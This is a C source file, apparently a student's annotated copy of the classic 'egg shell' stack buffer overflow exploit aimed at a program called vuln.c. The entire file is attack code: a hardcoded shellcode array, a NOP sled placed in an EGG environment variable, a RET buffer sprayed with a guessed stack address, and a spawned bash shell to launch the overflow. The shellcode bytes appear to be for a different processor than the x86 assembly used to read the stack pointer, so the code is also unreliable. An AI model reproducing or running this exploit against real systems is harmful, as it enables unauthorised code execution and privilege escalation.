#include <stdlib.h> /*has memory allocation, process control, conversions*/
#include <string.h>/*contain macro definitions, constants and declarations of functions and types*/
#include <stdio.h>/*input and output*/



#define DEFAULT_OFFSET                    0/*Default offset for the address*/
#define DEFAULT_BUFFER_SIZE             512/*Default buffer size for input*/
#define DEFAULT_EGG_SIZE               2048/*Default size for storing shellcode*/
#define NOP                            0x90/*Non operational hex*/

char shellcode[] =
  "\x2d\x0b\xd8\x9a\xac\x15\xa1\x6e\x2f\x0b\xdc\xda\x90\x0b\x80\x0e"
  "\x92\x03\xa0\x08\x94\x1a\x80\x0a\x9c\x03\xa0\x10\xec\x3b\xbf\xf0"
  "\xdc\x23\xbf\xf8\xc0\x23\xbf\xfc\x82\x10\x20\x3b\xaa\x10\x3f\xff"
  "\x91\xd5\x60\x01\x90\x1b\xc0\x0f\x82\x10\x20\x01\x91\xd5\x60\x01";//Shellcode used to fill up the buffer

unsigned long get_esp(void) {
   __asm__("movl %esp,%eax");//gets the address of the egg 
}

void main(int argc, char *argv[]) {
  char *buff, *ptr, *egg;//initialize variables to be manipulated 
  long *addr_ptr, addr;
  int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
  int i, eggsize=DEFAULT_EGG_SIZE;

  if (argc > 1) bsize   = atoi(argv[1]);//checks if it will pass to get the value for buffer size
  if (argc > 2) offset  = atoi(argv[2]);//checks if it will pass to get the value for offset
  if (argc > 3) eggsize = atoi(argv[3]);//checks if it will pass to get the value for egg size


  if (!(buff = malloc(bsize))) {//allocates the memory for the buffer size 
    printf("Can't allocate memory.\n");
    exit(0);
  }
  if (!(egg = malloc(eggsize))) {//allocates memory for the egg size
    printf("Can't allocate memory.\n");
    exit(0);
  }

  addr = get_esp() - offset;//takes the function and substracts with the offset for new address
  printf("Using address: 0x%x\n", addr);

  ptr = buff;//stores the address inside the buffer
  addr_ptr = (long *) ptr;
  for (i = 0; i < bsize; i+=4)
    *(addr_ptr++) = addr;

  ptr = egg;//stores the NOP inside the egg
  for (i = 0; i < eggsize - strlen(shellcode) - 1; i++)
    *(ptr++) = NOP;

  for (i = 0; i < strlen(shellcode); i++)//continues to store the rest of the shellcode into the egg
    *(ptr++) = shellcode[i];

  buff[bsize - 1] = '\0';//adds null terminator at the end of buff
  egg[eggsize - 1] = '\0';//adds null terminator at the end of egg

  memcpy(egg,"EGG=",4);//copies the name EGG into egg
  putenv(egg);//then sets it up into an environmental variable
  memcpy(buff,"RET=",4);//copies the name RET into buff
  putenv(buff);//then sets it up as an environmental variable
  system("/bin/bash");//opens up bash to get the exploit of the vuln.c file
}